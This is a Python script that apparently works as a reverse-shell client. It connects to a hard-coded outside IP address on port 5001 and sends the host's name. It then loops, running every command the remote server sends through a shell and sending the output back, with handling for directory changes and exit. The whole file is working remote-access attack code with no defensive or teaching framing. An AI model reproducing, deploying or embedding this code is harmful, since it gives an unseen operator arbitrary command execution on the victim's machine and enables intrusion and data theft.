import socket
import subprocess
import os

# Configuration
SERVER_IP = "167.71.130.184"
PORT = 5001

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((SERVER_IP, PORT))

    # Initialize the working directory
    current_directory = os.getcwd()

    # Send unique ID and hostname
    hostname = os.uname().nodename
    unique_id = f"{hostname}:{PORT}"
    client.send(unique_id.encode())

    while True:
        try:
            # Receive command from the server
            command = client.recv(1024).decode()

            if command.lower() == "exit":
                break

            if command:
                if command.startswith("cd "):
                    # Change the current working directory
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        current_directory = os.getcwd()
                        client.send(b"Directory changed.")
                    except FileNotFoundError:
                        client.send(b"Directory not found.")
                else:
                    # Execute the command and get output
                    result = subprocess.run(command, shell=True, cwd=current_directory, capture_output=True, text=True)
                    output = result.stdout + result.stderr
                    if output:
                        client.send(output.encode())
                    else:
                        client.send(b"No output from command.")
        except Exception as e:
            print(f"Error: {str(e)}")
            break

    client.close()

if __name__ == "__main__":
    connect_to_server()
